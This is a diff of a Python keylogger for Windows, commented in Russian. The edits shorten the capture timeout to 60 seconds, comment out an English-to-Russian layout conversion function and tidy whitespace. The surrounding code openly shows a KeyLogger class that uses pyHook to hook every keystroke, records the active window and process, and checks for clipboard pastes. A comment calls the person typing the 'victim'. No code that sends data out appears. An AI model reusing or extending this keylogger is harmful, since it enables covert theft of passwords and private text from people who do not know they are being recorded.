@@ -10,7 +10,7 @@ import win32clipboard
 import win32api
 import pygetwindow as gw
 
-TIMEOUT = 60 * 10
+TIMEOUT = 60 # * 10
 
 keyboard_layout_mapping = {
     'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з',
@@ -23,14 +23,14 @@ keyboard_layout_mapping = {
 }
 
 # Функция для перевода текста с английской на русскую раскладку и наоборот
-def translate_keyboard_layout(text, mapping):
-    translated_text = ""
-    for char in text:
-        if char in mapping:
-            translated_text += mapping[char]
-        else:
-            translated_text += char
-    return translated_text
+# def translate_keyboard_layout(text, mapping):
+#     translated_text = ""
+#     for char in text:
+#         if char in mapping:
+#             translated_text += mapping[char]
+#         else:
+#             translated_text += char
+#     return translated_text
 
 
 # translated_english_to_russian = translate_keyboard_layout(chr(event.Ascii), keyboard_layout_mapping)
@@ -76,11 +76,9 @@ class KeyLogger:
         """ выбрал ли пользователь новое окно, и если да, то получаем название нового окна и информацию о процессе."""
         if event.WindowName != self.current_window:
             self.get_current_process()
-
         """анализируем нажатую клавишу и, если она находится в печатном диапазоне ASCII, выводим ее."""
         if 32 < event.Ascii < 127:
             print(chr(event.Ascii), end='')
-
         else:
             """ Если это модификатор (такой как Shift, Ctrl или Alt) или любая нестандартная клавиша, извлекаем ее
                 название из объекта события. А также проверяем, выполняет ли пользователь операцию вставки, и если
@@ -102,11 +100,9 @@ def run():
 
     kl = KeyLogger()
     hm = pyHook.HookManager()
-
-
     hm.KeyDown = kl.mykeystroke  # Дальше привязываем событие KeyDown к обратному вызову mykeystroke, который
                                  # принадлежит классу KeyLogger.
-    """ просим PyWinHook перехватывать все нажатия клавиш  и продолжаем выполнение, пока не истечет время ожидания. 
+    """ просим PyWinHook перехватывать все нажатия клавиш и продолжаем выполнение, пока не истечет время ожидания. 
     Каждый раз, когда жертва нажимает клавишу на клавиатуре, вызывается наш метод mykeystroke с объектом события и его параметром."""
     hm.HookKeyboard()
     while time.thread_time() < TIMEOUT:
@@ -117,6 +113,5 @@ def run():
 
 
 if __name__ == "__main__":
-
     print(run())
     print('done.')
